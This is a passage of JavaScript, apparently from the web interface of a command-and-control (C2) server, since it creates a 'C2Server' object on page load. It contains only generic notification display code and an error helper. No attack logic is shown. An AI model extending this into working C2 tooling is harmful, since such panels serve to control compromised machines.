            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 20px;
            border-radius: 8px;
            color: white;
            font-weight: 500;
            z-index: 10000;
            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
            max-width: 300px;
        `;

        const colors = {
            success: 'var(--success-color)',
            error: 'var(--danger-color)',
            warning: 'var(--warning-color)',
            info: 'var(--primary-color)'
        };

        notification.style.background = colors[type] || colors.info;
        notification.textContent = message;

        document.body.appendChild(notification);

        setTimeout(() => {
            notification.style.opacity = '0';
            notification.style.transform = 'translateX(100%)';
            setTimeout(() => notification.remove(), 300);
        }, 3000);
    }

    showError(message) {
        this.showNotification(message, 'error');
    }
}

// Initialize when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    window.c2Server = new C2Server();
});

// Utility functions
function showNotification(message, type = 'info') {
    if (window.c2Server) {
        window.c2Server.showNotification(message, type);
    }
}


